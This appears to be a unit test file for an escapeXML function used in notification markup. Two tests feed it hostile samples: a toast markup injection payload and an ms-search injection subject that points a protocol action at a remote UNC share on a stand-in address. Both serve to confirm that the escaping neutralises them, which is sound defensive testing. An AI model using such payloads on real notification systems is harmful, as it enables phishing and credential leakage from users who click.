import { escapeXML } from "./xml";

describe("escapeXML", () => {
    it("escapes each XML metacharacter", () => {
        expect(escapeXML("&")).toBe("&amp;");
        expect(escapeXML("<")).toBe("&lt;");
        expect(escapeXML(">")).toBe("&gt;");
        expect(escapeXML('"')).toBe("&quot;");
        expect(escapeXML("'")).toBe("&apos;");
    });

    it("escapes ampersands before the entities emitted by later replacements", () => {
        expect(escapeXML("<")).toBe("&lt;");
        expect(escapeXML("&amp;")).toBe("&amp;amp;");
    });

    it("leaves benign text untouched", () => {
        expect(escapeXML("New email received")).toBe("New email received");
        expect(escapeXML("From: Alice - Lunch?")).toBe("From: Alice - Lunch?");
    });

    it("neutralises a toast markup injection payload", () => {
        const payload = `</text><actions><action content="pwn" arguments="malicious:uri" activationType="protocol"/></actions><text>`;
        const escaped = escapeXML(payload);

        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");
        expect(escaped).not.toContain('"');
        expect(escaped).toContain("&lt;/text&gt;");
        expect(escaped).toContain("&lt;actions&gt;");
    });

    it("neutralises a ms-search toast injection subject", () => {
        const maliciousSubject =
            '</text></binding></visual><actions><action content="Open" arguments="ms-search:displayname=Inbox&crumb=location:\\\\198.51.100.7\\share" activationType="protocol"/></actions><visual><binding template="ToastText02"><text id="2">You have a new message';

        const body = `From: Acme Notifications - ${maliciousSubject}`;
        const escaped = escapeXML(body);

        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");
        expect(escaped).toContain("ms-search:displayname=Inbox&amp;crumb=");
        expect(escaped).toContain("&lt;/text&gt;&lt;/binding&gt;&lt;/visual&gt;&lt;actions&gt;");
    });
});
